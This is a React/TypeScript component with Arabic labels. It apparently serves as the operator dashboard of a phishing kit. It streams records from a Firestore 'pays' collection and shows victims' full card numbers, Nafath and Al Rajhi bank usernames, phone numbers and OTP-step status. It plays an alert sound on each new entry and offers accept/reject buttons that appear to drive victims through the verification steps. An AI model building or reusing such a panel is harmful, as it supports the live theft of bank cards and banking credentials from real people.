"use client"

import { useState, useEffect, useRef } from "react"
import { format } from "date-fns"
import { collection, query, orderBy, onSnapshot, doc, writeBatch } from "firebase/firestore"
import { db } from "@/lib/firebase"
import { Badge } from "@/components/ui/badge"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { toast } from "sonner"
import {
  Bell,
  CheckCircle,
  Clock,
  CreditCard,
  Eye,
  FileText,
  Loader2,
  MoreHorizontal,
  RefreshCw,
  Shield,
  Smartphone,
  Tag,
  Trash2,
  User,
  XCircle,
} from "lucide-react"
import {
  DropdownMenu,
  DropdownMenuContent,
  DropdownMenuItem,
  DropdownMenuLabel,
  DropdownMenuSeparator,
  DropdownMenuTrigger,
} from "@/components/ui/dropdown-menu"
import type { Notification } from "@/types/notification"

interface ChatNotificationsProps {
  onViewDetails: (notification: Notification) => void
  onDelete: (id: string) => Promise<void>
  onApproval: (state: string, id: string) => Promise<void>
}

export function ChatNotifications({ onViewDetails, onDelete, onApproval }: ChatNotificationsProps) {
  const [notifications, setNotifications] = useState<Notification[]>([])
  const [isLoading, setIsLoading] = useState(true)
  const [isRefreshing, setIsRefreshing] = useState(false)
  const [searchTerm, setSearchTerm] = useState("")
  const [filteredNotifications, setFilteredNotifications] = useState<Notification[]>([])
  const messagesEndRef = useRef<HTMLDivElement>(null)
  const notificationSoundRef = useRef<HTMLAudioElement | null>(null)

  const playNotificationSound = () => {
    if (notificationSoundRef.current) {
      notificationSoundRef.current.currentTime = 0
      notificationSoundRef.current.play().catch((error) => {
        console.error("Error playing notification sound:", error)
      })
    }
  }

  useEffect(() => {
    fetchNotifications()
  }, [])

  useEffect(() => {
    if (searchTerm.trim() === "") {
      setFilteredNotifications(notifications)
    } else {
      const filtered = notifications.filter((notification) => {
        return (
          notification.full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.document_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.documment_owner_full_name?.toLowerCase().includes(searchTerm.toLowerCase()) ||
          notification.phone?.includes(searchTerm) ||
          notification.card_number?.includes(searchTerm)
        )
      })
      setFilteredNotifications(filtered)
    }
  }, [searchTerm, notifications])

  useEffect(() => {
    scrollToBottom()
  }, [filteredNotifications])

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" })
  }

  const fetchNotifications = () => {
    setIsLoading(true)
    const q = query(collection(db, "pays"), orderBy("createdDate", "desc"))
    const unsubscribe = onSnapshot(
      q,
      (querySnapshot) => {
        const notificationsData = querySnapshot.docs
          .map((doc) => ({ id: doc.id, ...doc.data() }) as any)
          .filter((notification: any) => !notification.isHidden) as Notification[]

        // Check if there are new notifications
        if (notifications.length > 0 && notificationsData.length > notifications.length) {
          playNotificationSound()
        }

        setNotifications(notificationsData)
        setFilteredNotifications(notificationsData)
        setIsLoading(false)
      },
      (error) => {
        console.error("Error fetching notifications:", error)
        setIsLoading(false)
      },
    )

    return unsubscribe
  }

  const refreshData = () => {
    setIsRefreshing(true)
    const unsubscribe = fetchNotifications()
    setTimeout(() => {
      setIsRefreshing(false)
      toast.success("تم تحديث البيانات بنجاح", {
        position: "top-center",
        duration: 2000,
      })
    }, 1000)
    return unsubscribe
  }

  const handleClearAll = async () => {
    try {
      const batch = writeBatch(db)
      notifications.forEach((notification) => {
        const docRef = doc(db, "pays", notification.id)
        batch.update(docRef, { isHidden: true })
      })
      await batch.commit()
      setNotifications([])
      setFilteredNotifications([])
      toast.success("تم مسح جميع البيانات بنجاح", {
        position: "top-center",
        duration: 3000,
        icon: <CheckCircle className="h-5 w-5" />,
      })
    } catch (error) {
      console.error("Error hiding all notifications:", error)
      toast.error("حدث خطأ أثناء مسح البيانات", {
        position: "top-center",
        duration: 3000,
        icon: <XCircle className="h-5 w-5" />,
      })
    }
  }

  const getPageType = (pagename?: string) => {
    let badge

    switch (pagename) {
      case "payment":
        badge = (
          <Badge variant="outline" className="bg-gradient-to-r from-cyan-500 to-cyan-600 text-white border-0 shadow-sm">
            <CreditCard className="h-3 w-3 mr-1" /> دفع
          </Badge>
        )
        break
      case "home":
        badge = (
          <Badge
            variant="outline"
            className="bg-gradient-to-r from-violet-500 to-violet-600 text-white border-0 shadow-sm"
          >
            <FileText className="h-3 w-3 mr-1" /> تسجيل
          </Badge>
        )
        break
      case "verify-otp":
        badge = (
          <Badge variant="outline" className="bg-gradient-to-r from-pink-500 to-pink-600 text-white border-0 shadow-sm">
            <Shield className="h-3 w-3 mr-1" /> رمز OTP
          </Badge>
        )
        break
      case "verify-phone":
        badge = (
          <Badge variant="outline" className="bg-gradient-to-r from-rose-500 to-rose-600 text-white border-0 shadow-sm">
            <Smartphone className="h-3 w-3 mr-1" /> رمز هاتف
          </Badge>
        )
        break
      case "external-link":
        badge = (
          <Badge
            variant="outline"
            className="bg-gradient-to-r from-emerald-500 to-emerald-600 text-white border-0 shadow-sm"
          >
            <Tag className="h-3 w-3 mr-1" /> راجحي
          </Badge>
        )
        break
      case "nafaz":
        badge = (
          <Badge variant="outline" className="bg-gradient-to-r from-teal-500 to-teal-600 text-white border-0 shadow-sm">
            <Shield className="h-3 w-3 mr-1" /> نفاذ
          </Badge>
        )
        break
      default:
        badge = (
          <Badge
            variant="outline"
            className="bg-gradient-to-r from-slate-500 to-slate-600 text-white border-0 shadow-sm"
          >
            <Tag className="h-3 w-3 mr-1" /> {pagename || "الرئيسية"}
          </Badge>
        )
    }

    return badge
  }

  const getStatusBadge = (paymentStatus?: string) => {
    if (!paymentStatus || paymentStatus === "pending") {
      return (
        <div className="flex items-center gap-1.5">
          <Clock className="h-3.5 w-3.5 text-amber-500" />
          <span className="text-amber-600 font-medium">قيد الانتظار</span>
        </div>
      )
    } else if (paymentStatus === "approved") {
      return (
        <div className="flex items-center gap-1.5">
          <CheckCircle className="h-3.5 w-3.5 text-emerald-500" />
          <span className="text-emerald-600 font-medium">مقبول</span>
        </div>
      )
    } else {
      return (
        <div className="flex items-center gap-1.5">
          <XCircle className="h-3.5 w-3.5 text-rose-500" />
          <span className="text-rose-600 font-medium">مرفوض</span>
        </div>
      )
    }
  }

  if (isLoading) {
    return (
      <div className="flex items-center justify-center h-64">
        <Loader2 className="h-8 w-8 animate-spin text-slate-400" />
      </div>
    )
  }

  return (
    <div className="flex flex-col h-full">
      <div className="flex items-center justify-between mb-4">
        <div className="relative w-full max-w-md">
          <Input
            placeholder="بحث في الإشعارات..."
            value={searchTerm}
            onChange={(e) => setSearchTerm(e.target.value)}
            className="pr-10"
          />
          <Button
            variant="ghost"
            size="icon"
            className="absolute left-1 top-1/2 -translate-y-1/2 h-8 w-8"
            onClick={() => setSearchTerm("")}
            disabled={!searchTerm}
          >
            {searchTerm ? <XCircle className="h-4 w-4" /> : null}
          </Button>
        </div>
        <div className="flex gap-2">
          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button variant="outline" size="icon" onClick={refreshData} disabled={isRefreshing}>
                  {isRefreshing ? <Loader2 className="h-4 w-4 animate-spin" /> : <RefreshCw className="h-4 w-4" />}
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>تحديث البيانات</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>

          <TooltipProvider>
            <Tooltip>
              <TooltipTrigger asChild>
                <Button
                  variant="destructive"
                  size="icon"
                  onClick={handleClearAll}
                  disabled={notifications.length === 0}
                >
                  <Trash2 className="h-4 w-4" />
                </Button>
              </TooltipTrigger>
              <TooltipContent>
                <p>مسح جميع الإشعارات</p>
              </TooltipContent>
            </Tooltip>
          </TooltipProvider>
        </div>
      </div>

      <div className="flex-1 overflow-y-auto space-y-4 pb-4 pr-1 -mr-1">
        {filteredNotifications.length === 0 ? (
          <div className="flex flex-col items-center justify-center h-64 text-center">
            <Bell className="h-12 w-12 text-slate-300 mb-4" />
            <h3 className="text-lg font-medium mb-2">لا توجد إشعارات</h3>
            <p className="text-muted-foreground max-w-md">
              {searchTerm
                ? "لا توجد نتائج مطابقة لمعايير البحث. يرجى تعديل معايير البحث."
                : "ستظهر الإشعارات الجديدة هنا عند وصولها"}
            </p>
          </div>
        ) : (
          filteredNotifications.map((notification) => (
            <Card
              key={notification.id}
              className={`border-slate-200 dark:border-slate-700 shadow-sm hover:shadow-md transition-shadow ${
                notification.status === "approved"
                  ? "border-l-4 border-l-emerald-500"
                  : notification.status === "rejected"
                    ? "border-l-4 border-l-rose-500"
                    : "border-l-4 border-l-amber-500"
              }`}
            >
              <CardHeader className="p-4 pb-2 flex flex-row items-start justify-between space-y-0">
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-full bg-slate-100 dark:bg-slate-700 flex items-center justify-center">
                    <User className="h-5 w-5 text-slate-600 dark:text-slate-300" />
                  </div>
                  <div>
                    <CardTitle className="text-base font-medium">
                      {notification.documment_owner_full_name || notification.document_owner_full_name || "غير محدد"}
                    </CardTitle>
                    <p className="text-sm text-muted-foreground mt-0.5">
                      {notification.phone || "رقم الهاتف غير متوفر"}
                    </p>
                  </div>
                </div>
                <div className="flex items-center gap-2">
                  {getPageType(notification.pagename)}
                  <DropdownMenu>
                    <DropdownMenuTrigger asChild>
                      <Button variant="ghost" size="icon" className="h-8 w-8">
                        <MoreHorizontal className="h-4 w-4" />
                      </Button>
                    </DropdownMenuTrigger>
                    <DropdownMenuContent align="end">
                      <DropdownMenuLabel>خيارات</DropdownMenuLabel>
                      <DropdownMenuSeparator />
                      <DropdownMenuItem onClick={() => onViewDetails(notification)}>
                        <Eye className="h-4 w-4 mr-2" />
                        عرض التفاصيل
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => onApproval("approved", notification.id)}>
                        <CheckCircle className="h-4 w-4 mr-2" />
                        قبول
                      </DropdownMenuItem>
                      <DropdownMenuItem onClick={() => onApproval("rejected", notification.id)}>
                        <XCircle className="h-4 w-4 mr-2" />
                        رفض
                      </DropdownMenuItem>
                      <DropdownMenuSeparator />
                      <DropdownMenuItem
                        onClick={() => onDelete(notification.id)}
                        className="text-rose-600 dark:text-rose-500"
                      >
                        <Trash2 className="h-4 w-4 mr-2" />
                        حذف
                      </DropdownMenuItem>
                    </DropdownMenuContent>
                  </DropdownMenu>
                </div>
              </CardHeader>
              <CardContent className="p-4 pt-2">
                <div className="grid grid-cols-2 gap-3 mt-2">
                  {notification.card_number && (
                    <div className="col-span-2 bg-slate-50 dark:bg-slate-800/50 p-3 rounded-md">
                      <div className="flex items-center gap-2 mb-1">
                        <CreditCard className="h-4 w-4 text-slate-600 dark:text-slate-300" />
                        <span className="text-sm font-medium">بيانات البطاقة</span>
                      </div>
                      <p className="text-sm font-mono" dir="ltr">
                        {notification.card_number.replace(/(\d{4})/g, "$1 ").trim()}
                      </p>
                    </div>
                  )}

                  {notification.nafadUsername && (
                    <div className="bg-teal-50 dark:bg-teal-900/20 p-2 rounded-md">
                      <span className="text-xs font-medium text-teal-700 dark:text-teal-300">نفاذ</span>
                      <p className="text-sm mt-1 font-medium">{notification.nafadUsername}</p>
                    </div>
                  )}

                  {notification.externalUsername && (
                    <div className="bg-emerald-50 dark:bg-emerald-900/20 p-2 rounded-md">
                      <span className="text-xs font-medium text-emerald-700 dark:text-emerald-300">راجحي</span>
                      <p className="text-sm mt-1 font-medium">{notification.externalUsername}</p>
                    </div>
                  )}

                  {notification.phone2 && (
                    <div className="bg-pink-50 dark:bg-pink-900/20 p-2 rounded-md">
                      <span className="text-xs font-medium text-pink-700 dark:text-pink-300">رقم الهاتف 2</span>
                      <p className="text-sm mt-1 font-medium font-mono">{notification.phone2}</p>
                    </div>
                  )}
                </div>
              </CardContent>
              <CardFooter className="p-4 pt-0 flex justify-between items-center border-t">
                <div className="text-sm text-muted-foreground">
                  {format(new Date(notification.createdDate), "yyyy/MM/dd HH:mm")}
                </div>
                <div>{getStatusBadge(notification.status)}</div>
              </CardFooter>
            </Card>
          ))
        )}
        <div ref={messagesEndRef} />
      </div>

      <audio ref={notificationSoundRef} preload="auto">
        <source src="/notification.mp3" type="audio/mp3" />
      </audio>
    </div>
  )
}

